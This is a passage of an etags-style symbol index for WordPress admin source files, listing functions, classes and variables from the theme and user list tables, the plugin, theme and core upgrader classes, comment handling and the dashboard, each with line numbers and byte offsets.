	var $features = array();features12,203
	var $features = array();features12,203
	function ajax_user_can() {ajax_user_can14,230
	function prepare_items() {prepare_items18,309
		$search_terms = array();search_terms24,496
		$search_string = '';search_string25,523
			$search_string = strtolower( stripslashes( $_REQUEST['s'] ) );search_string27,582
			$search_terms = array_unique( array_filter( array_map( 'trim', explode( ',', $search_string ) ) ) );search_terms28,648
			$this->features = $_REQUEST['features'];features32,799
		$paged = $this->get_pagenum();paged34,844
		$per_page = 36;per_page36,878
		$tabs = array();tabs39,950
		$nonmenu_tabs = array( 'theme-information' ); // Valid actions to perform which do not have a Menu item.nonmenu_tabs49,1355
		$tabs = apply_filters( 'install_themes_tabs', $tabs );tabs51,1463
		$nonmenu_tabs = apply_filters( 'install_themes_nonmenu_tabs', $nonmenu_tabs );nonmenu_tabs52,1520
			$tab = key( $tabs );tab56,1781
		$args = array( 'page' => $paged, 'per_page' => $per_page, 'fields' => $theme_field_defaults );args58,1806
				$type = isset( $_REQUEST['type'] ) ? stripslashes( $_REQUEST['type'] ) : 'term';type62,1942
				$args = false;args92,2691
		$api = themes_api( 'query_themes', $args );api98,2744
		$this->items = $api->themes;items103,2967
	function no_items() {no_items112,3148
	function get_views() {get_views116,3216
		$display_tabs = array();display_tabs119,3263
		foreach ( (array) $tabs as $action => $text ) {action120,3290
			$class = ( $action == $tab ) ? ' class="current"' : '';class121,3340
			$href = self_admin_url('theme-install.php?tab=' . $action);href122,3399
	function display() {display129,3575
	function display_rows() {display_rows149,4155
		$themes = $this->items;themes150,4182
	function single_row( $theme ) {single_row180,5649
		$name   = wp_kses( $theme->name,   $themes_allowedtags );name186,5750
		$author = wp_kses( $theme->author, $themes_allowedtags );author187,5810
		$preview_title = sprintf( __('Preview &#8220;%s&#8221;'), $name );preview_title189,5871
		$preview_url   = add_query_arg( array(preview_url190,5940
		$actions = array();actions195,6052
		$install_url = add_query_arg( array(install_url197,6075
		$update_url = add_query_arg( array(update_url202,6215
		$status = $this->_get_theme_status( $theme );status207,6354
		$actions = apply_filters( 'theme_install_actions', $actions, $theme );actions225,7402
	function theme_installer() {theme_installer251,8200
	function theme_installer_single( $theme ) {theme_installer_single279,9150
	function install_theme_info( $theme ) {install_theme_info297,9659
		$name   = wp_kses( $theme->name,   $themes_allowedtags );name303,9768
		$author = wp_kses( $theme->author, $themes_allowedtags );author304,9828
		$num_ratings = sprintf( _n( '(based on %s rating)', '(based on %s ratings)', $theme->num_ratings ), number_format_i18n( $theme->num_ratings ) );num_ratings306,9889
		$install_url = add_query_arg( array(install_url308,10037
		$update_url = add_query_arg( array(update_url313,10177
		$status = $this->_get_theme_status( $theme );status318,10316
	function _js_vars() {_js_vars366,12325
	private function _get_theme_status( $theme ) {_get_theme_status380,12621
		$status = 'install';status381,12669
		$installed_theme = wp_get_theme( $theme->slug );installed_theme383,12693
				$status = 'latest_installed';status386,12866
				$status = 'newer_installed';status388,12988
				$status = 'update_available';status390,13029

wordpress/wp-admin/includes/class-wp-themes-list-table.php,2707
class WP_Themes_List_Table extends WP_List_Table {WP_Themes_List_Table10,128
	protected $search_terms = array();search_terms12,180
	protected $search_terms = array();search_terms12,180
	var $features = array();features13,216
	var $features = array();features13,216
	function __construct() {__construct15,243
	function ajax_user_can() {ajax_user_can21,329
	function prepare_items() {prepare_items26,505
		$themes = wp_get_themes( array( 'allowed' => true ) );themes27,533
			$this->search_terms = array_unique( array_filter( array_map( 'trim', explode( ',', strtolower( stripslashes( $_REQUEST['s'] ) ) ) ) ) );search_terms30,626
			$this->features = $_REQUEST['features'];features33,809
			foreach ( $themes as $key => $theme ) {key36,904
		$per_page = 999;per_page45,1119
		$page = $this->get_pagenum();page46,1138
		$start = ( $page - 1 ) * $per_page;start48,1171
		$this->items = array_slice( $themes, $start, $per_page, true );items50,1210
	function no_items() {no_items59,1421
	function tablenav( $which = 'top' ) {tablenav87,2878
	function tablenav( $which = 'top' ) {which87,2878
	function display() {display99,3261
	function get_columns() {get_columns112,3545
	function display_rows() {display_rows116,3593
		$themes = $this->items;themes117,3620
			$template   = $theme->get_template();template122,3721
			$stylesheet = $theme->get_stylesheet();stylesheet123,3762
			$title      = $theme->display('Name');title124,3805
			$version    = $theme->display('Version');version125,3847
			$author     = $theme->display('Author');author126,3892
			$activate_link = wp_nonce_url( "themes.php?action=activate&amp;template=" . urlencode( $template ) . "&amp;stylesheet=" . urlencode( $stylesheet ), 'switch-theme_' . $stylesheet );activate_link128,3937
			$preview_link = esc_url( add_query_arg(preview_link130,4122
			$actions = array();actions134,4349
			$actions       = apply_filters( 'theme_action_links', $actions, $theme );actions150,5427
			$delete_action = isset( $actions['delete'] ) ? '<div class="delete-theme">' . $actions['delete'] . '</div>' : '';delete_action151,5504
				<?php if ( $screenshot = $theme->get_screenshot() ) : ?>screenshot157,5741
				<?php if ( $screenshot = $theme->get_screenshot() ) : ?>screenshot162,6010
	function search_theme( $theme ) {search_theme200,7889
	 function _js_vars( $extra_args = array() ) {_js_vars240,8838
	 function _js_vars( $extra_args = array() ) {extra_args240,8838
		$search_string = isset( $_REQUEST['s'] ) ? esc_attr( stripslashes( $_REQUEST['s'] ) ) : '';search_string241,8885
		$args = array(args243,8980
			$args = array_merge( $args, $extra_args );args251,9253

wordpress/wp-admin/includes/class-wp-upgrader.php,22718
 * A File upgrader class for WordPress.for3,10
 * WordPress Upgrader class for Upgrading/Installing a local set of files via the Filesystem Abstraction classes from a Zip file.for15,378
class WP_Upgrader {WP_Upgrader23,630
	var $strings = array();strings24,650
	var $strings = array();strings24,650
	var $skin = null;skin25,675
	var $skin = null;skin25,675
	var $result = array();result26,694
	var $result = array();result26,694
	function __construct($skin = null) {__construct28,719
			$this->skin = new WP_Upgrader_Skin();skin30,780
			$this->skin = $skin;skin32,828
	function init() {init35,856
	function generic_strings() {generic_strings40,943
	function fs_connect( $directories = array() ) {fs_connect61,2206
	function fs_connect( $directories = array() ) {directories61,2206
			$error = true;error68,2422
				$error = $wp_filesystem->errors;error70,2520
	function download_package($package) {download_package108,3937
		$download_file = download_url($package);download_file118,4284
	function unpack_package($package, $delete_package = true) {unpack_package126,4510
	function unpack_package($package, $delete_package = true) {delete_package126,4510
		$upgrade_folder = $wp_filesystem->wp_content_dir() . 'upgrade/';upgrade_folder131,4641
		$upgrade_files = $wp_filesystem->dirlist($upgrade_folder);upgrade_files134,4764
		$working_dir = $upgrade_folder . basename($package, '.zip');working_dir141,5002
		$result = unzip_file($package, $working_dir); //TODO optimizations, Copy when Move/Rename would suffice?result148,5232
	function install_package($args = array()) {install_package165,5757
		$defaults = array( 'source' => '', 'destination' => '', //Please always pass thesedefaults167,5827
		$args = wp_parse_args($args, $defaults);args171,6007
		$res = apply_filters('upgrader_pre_install', true, $hook_extra);res181,6262
		$remote_source = $source;remote_source186,6421
		$local_destination = $destination;local_destination187,6449
		$source_files = array_keys( $wp_filesystem->dirlist($remote_source) );source_files189,6487
		$remote_destination = $wp_filesystem->find_folder($local_destination);remote_destination190,6560
			$source = trailingslashit($source) . trailingslashit($source_files[0]);source194,6901
			$source = trailingslashit($source);source198,7313
		$source = apply_filters('upgrader_source_selection', $source, $remote_source, $this);source201,7407
			$source_files = array_keys( $wp_filesystem->dirlist($source) );source_files207,7658
			$remote_destination = trailingslashit($remote_destination) . trailingslashit(basename($source));remote_destination211,7910
			$destination = trailingslashit($destination) . trailingslashit(basename($source));destination212,8010
			$removed = true;removed218,8240
				$removed = $wp_filesystem->delete($remote_destination, true);removed220,8314
			$removed = apply_filters('upgrader_clear_destination', $removed, $local_destination, $remote_destination, $hook_extra);removed221,8380
			$_files = $wp_filesystem->dirlist($remote_destination);_files230,8894
		$result = copy_dir($source, $remote_destination);result243,9461
		$destination_name = basename( str_replace($local_destination, '', $destination) );destination_name254,9748
			$destination_name = '';destination_name256,9867
		$this->result = compact('local_source', 'source', 'source_name', 'source_files', 'destination', 'destination_name', 'local_destination', 'remote_destination', 'clear_destination', 'delete_source_dir');result258,9895
		$res = apply_filters('upgrader_post_install', true, $hook_extra, $this->result);res260,10100
			$this->result = $res;result262,10212
		//Bombard the calling function will all the info which we've just used.will266,10258
	function run($options) {run270,10360
		$defaults = array( 	'package' => '', //Please always pass this.defaults272,10387
		$options = wp_parse_args($options, $defaults);options280,10713
		$res = $this->fs_connect( array(WP_CONTENT_DIR, $destination) );res284,10821
		$download = $this->download_package( $package );download299,11279
		$delete_package = ($download != $package); // Do not delete a "local" filedelete_package306,11449
		$working_dir = $this->unpack_package( $download, $delete_package );working_dir309,11574
		$result = $this->install_package( array(result317,11847
	function maintenance_mode($enable = false) {maintenance_mode340,12444
		$file = $wp_filesystem->abspath() . '.maintenance';file342,12515
			$maintenance_string = '<?php $upgrading = ' . time() . '; ?>';maintenance_string346,12697
 * Plugin Upgrader class for WordPress Plugins, It is designed to upgrade/install plugins from a local zip, remote zip URL, or uploaded zip file.for358,13027
class Plugin_Upgrader extends WP_Upgrader {Plugin_Upgrader366,13295
	var $result;result368,13340
	var $bulk = false;bulk369,13354
	var $bulk = false;bulk369,13354
	var $show_before = '';show_before370,13374
	var $show_before = '';show_before370,13374
	function upgrade_strings() {upgrade_strings372,13399
	function install_strings() {install_strings383,14067
	function install($package) {install392,14583
	function upgrade($plugin) {upgrade419,15267
		$current = get_site_transient( 'update_plugins' );current424,15343
		$r = $current->response[ $plugin ];r434,15625
	function bulk_upgrade($plugins) {bulk_upgrade462,16732
		$this->bulk = true;bulk465,16785
		$current = get_site_transient( 'update_plugins' );current468,16836
		$res = $this->fs_connect( array(WP_CONTENT_DIR, WP_PLUGIN_DIR) );res475,17042
		$maintenance = is_multisite(); // @TODO: This should only kick in for individual sites if at all possible.maintenance484,17288
			$maintenance = $maintenance || (is_plugin_active($plugin) && isset($current->response[ $plugin ]) ); // Only activate Maintenance mode if a plugin is active AND has an update availablemaintenance486,17431
		$results = array();results490,17676
		$this->update_count = count($plugins);update_count492,17699
		$this->update_current = 0;update_current493,17740
			$r = $current->response[ $plugin ];r508,18190
			$result = $this->run(array(result512,18290
	function check_package($source) {check_package546,19150
		$working_directory = str_replace( $wp_filesystem->wp_content_dir(), trailingslashit(WP_CONTENT_DIR), $source);working_directory552,19261
		$plugins_found = false;plugins_found557,19556
			$info = get_plugin_data($file, false, false);info559,19644
				$plugins_found = true;plugins_found561,19729
	function plugin_info() {plugin_info573,19975
		$plugin = get_plugins('/' . $this->result['destination_name']); //Ensure to pass with leading slashplugin579,20121
		$pluginfiles = array_keys($plugin); //Assume the requested plugin is the first in the listpluginfiles583,20265
	function deactivate_plugin_before_upgrade($return, $plugin) {deactivate_plugin_before_upgrade589,20456
		$plugin = isset($plugin['plugin']) ? $plugin['plugin'] : '';plugin594,20580
	function delete_old_plugin($removed, $local_destination, $remote_destination, $plugin) {delete_old_plugin605,20938
		$plugin = isset($plugin['plugin']) ? $plugin['plugin'] : '';plugin611,21129
		$plugins_dir = $wp_filesystem->wp_plugins_dir();plugins_dir615,21287
		$this_plugin_dir = trailingslashit( dirname($plugins_dir . $plugin) );this_plugin_dir616,21338
			$deleted = $wp_filesystem->delete($this_plugin_dir, true);deleted623,21747
			$deleted = $wp_filesystem->delete($plugins_dir . $plugin);deleted625,21816
 * Theme Upgrader class for WordPress Themes, It is designed to upgrade/install themes from a local zip, remote zip URL, or uploaded zip file.for635,22007
class Theme_Upgrader extends WP_Upgrader {Theme_Upgrader643,22272
	var $result;result645,22316
	var $bulk = false;bulk646,22330
	var $bulk = false;bulk646,22330
	function upgrade_strings() {upgrade_strings648,22351
	function install_strings() {install_strings659,23014
	function check_parent_theme_filter($install_result, $hook_extra, $child_result) {check_parent_theme_filter678,24529
		$theme_info = $this->theme_info();theme_info680,24667
		$api = themes_api('theme_information', array('slug' => $theme_info->get('Template'), 'fields' => array('sections' => false, 'tags' => false) ) ); //Save on a bit of bandwidth.api694,25141
		$child_api = $this->skin->api;child_api704,25683
		$child_success_message = $this->strings['process_success'];child_success_message705,25716
		$parent_result = $this->run( array(parent_result716,26193
		$this->result = $child_result;result730,26710
	function hide_activate_preview_actions($actions) {hide_activate_preview_actions737,26869
	function install($package) {install742,26996
		$options = array(options750,27240
	function upgrade($theme) {upgrade774,27933
		$current = get_site_transient( 'update_themes' );current780,28037
		$r = $current->response[ $theme ];r789,28284
		$options = array(options795,28565
	function bulk_upgrade($themes) {bulk_upgrade823,29387
		$this->bulk = true;bulk826,29439
		$current = get_site_transient( 'update_themes' );current829,29490
		$res = $this->fs_connect( array(WP_CONTENT_DIR) );res838,29850
		$maintenance = is_multisite(); // @TODO: This should only kick in for individual sites if at all possible.maintenance847,30080
			$maintenance = $maintenance || $theme == get_stylesheet() || $theme == get_template();maintenance849,30221
		$results = array();results853,30368
		$this->update_count = count($themes);update_count855,30391
		$this->update_current = 0;update_current856,30431
			$r = $current->response[ $theme ];r872,30842
			$options = array(options874,30881
			$result = $this->run($options);result884,31142
	function check_package($source) {check_package913,31994
		$working_directory = str_replace( $wp_filesystem->wp_content_dir(), trailingslashit(WP_CONTENT_DIR), $source);working_directory920,32150
		$info = get_file_data( $working_directory . 'style.css', array( 'Name' => 'Theme Name', 'Template' => 'Template' ) );info928,32684
	function current_before($return, $theme) {current_before940,33354
		$theme = isset($theme['theme']) ? $theme['theme'] : '';theme945,33449
	function current_after($return, $theme) {current_after956,33696
		$theme = isset($theme['theme']) ? $theme['theme'] : '';theme960,33789
		if ( $theme == get_stylesheet() && $theme != $this->result['destination_name'] ) {theme967,34075
			$theme_info = $this->theme_info();theme_info968,34160
			$stylesheet = $this->result['destination_name'];stylesheet969,34198
			$template = $theme_info->get_template();template970,34250
	function delete_old_theme($removed, $local_destination, $remote_destination, $theme) {delete_old_theme980,34462
		$theme = isset($theme['theme']) ? $theme['theme'] : '';theme983,34576
		$themes_dir = $wp_filesystem->wp_themes_dir();themes_dir988,34727
	function theme_info($theme = null) {theme_info995,34968
				$theme = $this->result['destination_name'];theme999,35084
 * Core Upgrader class for WordPress. It allows for WordPress to upgrade itself in combination with the wp-admin/includes/update-core.php filefor1009,35235
class Core_Upgrader extends WP_Upgrader {Core_Upgrader1017,35500
	function upgrade_strings() {upgrade_strings1019,35543
	function upgrade($current) {upgrade1028,36073
		$res = $this->fs_connect( array(ABSPATH, WP_CONTENT_DIR) );res1041,36431
		$wp_dir = trailingslashit($wp_filesystem->abspath());wp_dir1045,36537
		if ( $current->packages->partial && 'reinstall' != $current->response && $wp_version == $current->partial_version )wp_version1051,36916
			$to_download = 'partial';to_download1052,37034
			$to_download = 'new_bundled';to_download1055,37260
			$to_download = 'no_content';to_download1057,37337
			$to_download = 'full';to_download1059,37376
		$download = $this->download_package( $current->packages->$to_download );download1061,37403
		$working_dir = $this->unpack_package( $download );working_dir1065,37532
class WP_Upgrader_Skin {WP_Upgrader_Skin1095,38540
	var $upgrader;upgrader1097,38566
	var $done_header = false;done_header1098,38582
	var $done_header = false;done_header1098,38582
	var $result = false;result1099,38609
	var $result = false;result1099,38609
	function __construct($args = array()) {__construct1101,38632
		$defaults = array( 'url' => '', 'nonce' => '', 'title' => '', 'context' => false );defaults1102,38673
		$this->options = wp_parse_args($args, $defaults);options1103,38759
	function set_upgrader(&$upgrader) {set_upgrader1106,38815
			$this->upgrader =& $upgrader;upgrader1108,38882
	function add_strings() {add_strings1112,38943
	function set_result($result) {set_result1115,38973
		$this->result = $result;result1116,39005
	function request_filesystem_credentials($error = false) {request_filesystem_credentials1119,39036
		$url = $this->options['url'];url1120,39095
		$context = $this->options['context'];context1121,39127
			$url = wp_nonce_url($url, $this->options['nonce']);url1123,39208
	function header() {header1127,39387
		$this->done_header = true;done_header1130,39447
	function footer() {footer1135,39581
	function error($errors) {error1139,39623
	function feedback($string) {feedback1154,40043
			$string = $this->upgrader->strings[$string];string1156,40125
			$args = func_get_args();args1159,40216
			$args = array_splice($args, 1);args1160,40244
				$string = vsprintf($string, $args);string1162,40303
	function before() {}before1168,40410
	function after() {}after1169,40432
class Plugin_Upgrader_Skin extends WP_Upgrader_Skin {Plugin_Upgrader_Skin1182,40638
	var $plugin = '';plugin1183,40692
	var $plugin = '';plugin1183,40692
	var $plugin_active = false;plugin_active1184,40711
	var $plugin_active = false;plugin_active1184,40711
	var $plugin_network_active = false;plugin_network_active1185,40740
	var $plugin_network_active = false;plugin_network_active1185,40740
	function __construct($args = array()) {__construct1187,40778
		$defaults = array( 'url' => '', 'plugin' => '', 'nonce' => '', 'title' => __('Update Plugin') );defaults1188,40819
		$args = wp_parse_args($args, $defaults);args1189,40918
		$this->plugin = $args['plugin'];plugin1191,40962
		$this->plugin_active = is_plugin_active( $this->plugin );plugin_active1193,40998
		$this->plugin_network_active = is_plugin_active_for_network( $this->plugin );plugin_network_active1194,41058
	function after() {after1199,41173
		$this->plugin = $this->upgrader->plugin_info();plugin1200,41193
		$update_actions =  array(update_actions1205,41597
		$update_actions = apply_filters('update_plugin_complete_actions', $update_actions, $this->plugin);update_actions1214,42245
	function before() {before1219,42444
class Bulk_Upgrader_Skin extends WP_Upgrader_Skin {Bulk_Upgrader_Skin1234,42719
	var $in_loop = false;in_loop1235,42771
	var $in_loop = false;in_loop1235,42771
	var $error = false;error1236,42794
	var $error = false;error1236,42794
	function __construct($args = array()) {__construct1238,42816
		$defaults = array( 'url' => '', 'nonce' => '' );defaults1239,42857
		$args = wp_parse_args($args, $defaults);args1240,42908
	function add_strings() {add_strings1245,42986
	function feedback($string) {feedback1253,43705
			$string = $this->upgrader->strings[$string];string1255,43787
			$args = func_get_args();args1258,43878
			$args = array_splice($args, 1);args1259,43906
				$string = vsprintf($string, $args);string1261,43965
	function header() {header1271,44134
	function footer() {footer1275,44213
	function error($error) {error1278,44291
			$this->error = $this->upgrader->strings[$error];error1280,44389
			$this->error = implode(', ', $messages);error1289,44675
	function bulk_header() {bulk_header1294,44854
	function bulk_footer() {bulk_footer1298,44925
	function before($title = '') {before1302,44994
		$this->in_loop = true;in_loop1303,45026
	function after($title = '') {after1310,45645
	function reset() {reset1329,46651
		$this->in_loop = false;in_loop1330,46671
		$this->error = false;error1331,46697
	function flush_output() {flush_output1334,46725
class Bulk_Plugin_Upgrader_Skin extends Bulk_Upgrader_Skin {Bulk_Plugin_Upgrader_Skin1340,46794
	var $plugin_info = array(); // Plugin_Upgrader::bulk() will fill this in.plugin_info1341,46855
	var $plugin_info = array(); // Plugin_Upgrader::bulk() will fill this in.plugin_info1341,46855
	function __construct($args = array()) {__construct1343,46931
	function add_strings() {add_strings1347,47006
	function before() {before1352,47159
	function after() {after1356,47231
	function bulk_footer() {bulk_footer1359,47300
		$update_actions =  array(update_actions1361,47351
		$update_actions = apply_filters('update_bulk_plugins_complete_actions', $update_actions, $this->plugin_info);update_actions1366,47761
class Bulk_Theme_Upgrader_Skin extends Bulk_Upgrader_Skin {Bulk_Theme_Upgrader_Skin1372,47973
	var $theme_info = array(); // Theme_Upgrader::bulk() will fill this in.theme_info1373,48033
	var $theme_info = array(); // Theme_Upgrader::bulk() will fill this in.theme_info1373,48033
	function __construct($args = array()) {__construct1375,48107
	function add_strings() {add_strings1379,48182
	function before() {before1384,48334
	function after() {after1388,48415
	function bulk_footer() {bulk_footer1392,48494
		$update_actions =  array(update_actions1394,48545
		$update_actions = apply_filters('update_bulk_theme_complete_actions', $update_actions, $this->theme_info );update_actions1399,48951
class Plugin_Installer_Skin extends WP_Upgrader_Skin {Plugin_Installer_Skin1414,49344
	var $api;api1415,49399
	var $type;type1416,49410
	function __construct($args = array()) {__construct1418,49423
		$defaults = array( 'type' => 'web', 'url' => '', 'plugin' => '', 'nonce' => '', 'title' => '' );defaults1419,49464
		$args = wp_parse_args($args, $defaults);args1420,49563
		$this->type = $args['type'];type1422,49607
		$this->api = isset($args['api']) ? $args['api'] : array();api1423,49638
	function before() {before1428,49734
	function after() {after1433,49950
		$plugin_file = $this->upgrader->plugin_info();plugin_file1435,49971
		$install_actions = array();install_actions1437,50021
		$from = isset($_GET['from']) ? stripslashes($_GET['from']) : 'plugins';from1439,50052
		else if ( $this->type == 'web' )type1453,51402
		$install_actions = apply_filters('install_plugin_complete_actions', $install_actions, $this->api, $plugin_file);install_actions1462,52020
class Theme_Installer_Skin extends WP_Upgrader_Skin {Theme_Installer_Skin1477,52422
	var $api;api1478,52476
	var $type;type1479,52487
	function __construct($args = array()) {__construct1481,52500
		$defaults = array( 'type' => 'web', 'url' => '', 'theme' => '', 'nonce' => '', 'title' => '' );defaults1482,52541
		$args = wp_parse_args($args, $defaults);args1483,52639
		$this->type = $args['type'];type1485,52683
		$this->api = isset($args['api']) ? $args['api'] : array();api1486,52714
	function before() {before1491,52810
	function after() {after1496,53015
		$theme_info = $this->upgrader->theme_info();theme_info1500,53107
		$name       = $theme_info->display('Name');name1504,53196
		$stylesheet = $this->upgrader->result['destination_name'];stylesheet1505,53242
		$template   = $theme_info->get_template();template1506,53303
		$preview_link = add_query_arg( array(preview_link1508,53349
		$activate_link = add_query_arg( array(activate_link1514,53542
		$activate_link = wp_nonce_url( $activate_link, 'switch-theme_' . $stylesheet );activate_link1519,53734
		$install_actions = array();install_actions1521,53817
		if ( $this->type == 'web' )type1529,54879
		$install_actions = apply_filters('install_theme_complete_actions', $install_actions, $this->api, $stylesheet, $theme_info);install_actions1537,55463
class Theme_Upgrader_Skin extends WP_Upgrader_Skin {Theme_Upgrader_Skin1552,55870
	var $theme = '';theme1553,55923
	var $theme = '';theme1553,55923
	function __construct($args = array()) {__construct1555,55942
		$defaults = array( 'url' => '', 'theme' => '', 'nonce' => '', 'title' => __('Update Theme') );defaults1556,55983
		$args = wp_parse_args($args, $defaults);args1557,56080
		$this->theme = $args['theme'];theme1559,56124
	function after() {after1564,56192
		$update_actions = array();update_actions1566,56213
		if ( ! empty( $this->upgrader->result['destination_name'] ) && $theme_info = $this->upgrader->theme_info() ) {theme_info1567,56242
			$name       = $theme_info->display('Name');name1568,56355
			$stylesheet = $this->upgrader->result['destination_name'];stylesheet1569,56402
			$template   = $theme_info->get_template();template1570,56464
			$preview_link = add_query_arg( array(preview_link1572,56511
			$activate_link = add_query_arg( array(activate_link1578,56709
			$activate_link = wp_nonce_url( $activate_link, 'switch-theme_' . $stylesheet );activate_link1583,56906
		$update_actions = apply_filters('update_theme_complete_actions', $update_actions, $this->theme);update_actions1599,58295
 * Upgrade Skin helper for File uploads. This class handles the upload process and passes it as if its a local file to the Upgrade/Installer functions.handles1606,58498
class File_Upload_Upgrader {File_Upload_Upgrader1614,58772
	var $package;package1615,58801
	var $filename;filename1616,58816
	var $id = 0;id1617,58832
	var $id = 0;id1617,58832
	function __construct($form, $urlholder) {__construct1619,58847
			$overrides = array( 'test_form' => false, 'test_type' => false );overrides1626,59098
			$file = wp_handle_upload( $_FILES[$form], $overrides );file1627,59167
			$this->filename = $_FILES[$form]['name'];filename1632,59292
			$this->package = $file['file'];package1633,59337
			$object = array(object1636,59406
			$this->id = wp_insert_attachment( $object, $file['file'] );id1646,59653
			$this->id = (int) $_GET[$urlholder];id1653,59996
			$attachment = get_post( $this->id );attachment1654,60036
			$this->filename = $attachment->post_title;filename1658,60146
			$this->package = get_attached_file( $attachment->ID );package1659,60192
			if ( ! ( ( $uploads = wp_upload_dir() ) && false === $uploads['error'] ) )uploads1662,60367
			$this->filename = $_GET[$urlholder];filename1665,60479
			$this->package = $uploads['basedir'] . '/' . $this->filename;package1666,60519
	function cleanup() {cleanup1670,60592

wordpress/wp-admin/includes/class-wp-users-list-table.php,4741
class WP_Users_List_Table extends WP_List_Table {WP_Users_List_Table10,127
	var $site_id;site_id12,178
	var $is_site_users;is_site_users13,193
	function __construct() {__construct15,215
		$screen = get_current_screen();screen16,241
		$this->is_site_users = 'site-users-network' == $screen->id;is_site_users17,275
			$this->site_id = isset( $_REQUEST['id'] ) ? intval( $_REQUEST['id'] ) : 0;site_id20,368
	function ajax_user_can() {ajax_user_can28,538
	function prepare_items() {prepare_items35,697
		$usersearch = isset( $_REQUEST['s'] ) ? $_REQUEST['s'] : '';usersearch38,755
		$role = isset( $_REQUEST['role'] ) ? $_REQUEST['role'] : '';role40,819
		$per_page = ( $this->is_site_users ) ? 'site_users_network_per_page' : 'users_per_page';per_page42,883
		$users_per_page = $this->get_items_per_page( $per_page );users_per_page43,974
		$paged = $this->get_pagenum();paged45,1035
		$args = array(args47,1069
		$wp_user_search = new WP_User_Query( $args );wp_user_search68,1602
		$this->items = $wp_user_search->get_results();items70,1651
	function no_items() {no_items78,1833
	function get_views() {get_views82,1901
			$url = 'site-users.php?id=' . $this->site_id;url86,1985
			$users_of_blog = count_users();users_of_blog88,2071
			$url = 'users.php';url91,2144
			$users_of_blog = count_users();users_of_blog92,2167
		$total_users = $users_of_blog['total_users'];total_users94,2206
		$avail_roles =& $users_of_blog['avail_roles'];avail_roles95,2254
		$current_role = false;current_role98,2329
		$class = empty($role) ? ' class="current"' : '';class99,2354
		$role_links = array();role_links100,2405
		foreach ( $wp_roles->get_names() as $this_role => $name ) {this_role102,2643
			$class = '';class106,2763
			if ( $this_role == $role ) {this_role108,2780
				$current_role = $role;current_role109,2812
				$class = ' class="current"';class110,2839
			$name = translate_user_role( $name );name113,2878
			$name = sprintf( __('%1$s <span class="count">(%2$s)</span>'), $name, number_format_i18n( $avail_roles[$this_role] ) );name115,2967
	function get_bulk_actions() {get_bulk_actions122,3240
		$actions = array();actions123,3271
	function extra_tablenav( $which ) {extra_tablenav136,3531
	function current_action() {current_action153,4046
	function get_columns() {get_columns160,4207
		$c = array(c161,4233
	function get_sortable_columns() {get_sortable_columns176,4533
		$c = array(c177,4568
	function display_rows() {display_rows189,4738
			$post_counts = count_many_users_posts( array_keys( $this->items ) );post_counts192,4838
		$style = '';style194,4911
		foreach ( $this->items as $userid => $user_object ) {userid195,4926
			$role = reset( $user_object->roles );role196,4982
			$style = ( ' class="alternate"' == $style ) ? '' : ' class="alternate"';style201,5082
	function single_row( $user_object, $style = '', $role = '', $numposts = 0 ) {single_row217,5707
	function single_row( $user_object, $style = '', $role = '', $numposts = 0 ) {style217,5707
			$user_object = new WP_User( (int) $user_object );user_object221,5882
		$email = $user_object->user_email;email223,5971
			$url = "site-users.php?id={$this->site_id}&amp;";url226,6039
			$url = 'users.php?';url228,6099
		$checkbox = '';checkbox230,6124
				$edit_link = 'profile.php';edit_link236,6392
				$edit_link = esc_url( add_query_arg( 'wp_http_referer', urlencode( stripslashes( $_SERVER['REQUEST_URI'] ) ), "user-edit.php?user_id=$user_object->ID" ) );edit_link238,6436
			$actions = array();actions242,6647
				$edit = "<strong><a href=\"$edit_link\">$user_object->user_login</a></strong><br />";edit245,6734
				$edit = "<strong>$user_object->user_login</strong><br />";edit248,6916
			$actions = apply_filters( 'user_row_actions', $actions, $user_object );actions255,7583
			$checkbox = "<input type='checkbox' name='users[]' id='user_{$user_object->ID}' class='$role' value='{$user_object->ID}' />";checkbox259,7783
			$edit = '<strong>' . $user_object->user_login . '</strong>';edit262,7924
		$role_name = isset( $wp_roles->role_names[$role] ) ? translate_user_role( $wp_roles->role_names[$role] ) : __( 'None' );role_name264,7992
		$avatar = get_avatar( $user_object->ID, 32 );avatar265,8115
		$r = "<tr id='user-$user_object->ID'$style>";r267,8164
		foreach ( $columns as $column_name => $column_display_name ) {column_name271,8270
			$class = "class=\"$column_name column-$column_name\"";class272,8335
			$style = '';style274,8394
				$style = ' style="display:none;"';style276,8454
			$attributes = "$class$style";attributes278,8494
					$attributes = 'class="posts column-posts num"' . $style;attributes297,9104

wordpress/wp-admin/includes/comment.php,1622
function comment_exists($comment_author, $comment_date) {comment_exists19,344
	$comment_author = stripslashes($comment_author);comment_author22,418
	$comment_date = stripslashes($comment_date);comment_date23,468
function edit_comment() {edit_comment34,769
		$aa = $_POST['aa'];aa54,1550
		$mm = $_POST['mm'];mm55,1572
		$jj = $_POST['jj'];jj56,1594
		$hh = $_POST['hh'];hh57,1616
		$mn = $_POST['mn'];mn58,1638
		$ss = $_POST['ss'];ss59,1660
		$jj = ($jj > 31 ) ? 31 : $jj;jj60,1682
		$hh = ($hh > 23 ) ? $hh -24 : $hh;hh61,1714
		$mn = ($mn > 59 ) ? $mn -60 : $mn;mn62,1751
		$ss = ($ss > 59 ) ? $ss -60 : $ss;ss63,1788
function get_comment_to_edit( $id ) {get_comment_to_edit78,2091
function get_pending_comments_num( $post_id ) {get_pending_comments_num105,3085
	$single = false;single108,3149
		$post_id_array = (array) $post_id;post_id_array110,3197
		$single = true;single111,3234
		$post_id_array = $post_id;post_id_array113,3262
	$post_id_array = array_map('intval', $post_id_array);post_id_array115,3294
	$post_id_in = "'" . implode("', '", $post_id_array) . "'";post_id_in116,3349
	$pending = $wpdb->get_results( "SELECT comment_post_ID, COUNT(comment_ID) as num_comments FROM $wpdb->comments WHERE comment_post_ID IN ( $post_id_in ) AND comment_approved = '0' GROUP BY comment_post_ID", ARRAY_A );pending118,3410
	$pending_keyed = array();pending_keyed127,3743
function floated_admin_avatar( $name ) {floated_admin_avatar149,4228
	$avatar = get_avatar( $comment, 32 );avatar151,4287
function enqueue_comment_hotkeys_js() {enqueue_comment_hotkeys_js155,4354

wordpress/wp-admin/includes/continents-cities.php,0

wordpress/wp-admin/includes/dashboard.php,20077
function wp_dashboard_setup() {wp_dashboard_setup16,227
	$wp_dashboard_control_callbacks = array();wp_dashboard_control_callbacks18,356
	$screen = get_current_screen();screen19,400
	$update = false;update21,434
	$widget_options = get_option( 'dashboard_widget_options' );widget_options22,452
		$widget_options = array();widget_options24,568
	$response = wp_check_browser_version();response28,636
			$update = true;update48,1648
		$recent_comments_title = __( 'Recent Comments' );recent_comments_title53,1752
			$update = true;update60,2258
